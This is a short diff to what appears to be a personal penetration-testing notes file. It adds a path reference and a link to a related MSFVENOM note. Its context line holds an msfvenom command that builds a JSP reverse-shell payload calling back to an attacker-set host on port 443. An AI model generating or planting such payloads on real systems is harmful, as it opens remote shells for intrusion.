@@ -3,6 +3,8 @@
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=443 -f raw > shell.jsp
 ```
 
+` zet/20221003150760/README.md `
+
 # Related
 
 - [20221003150777](/zet/20221003150777/README.md) MSFVENOM
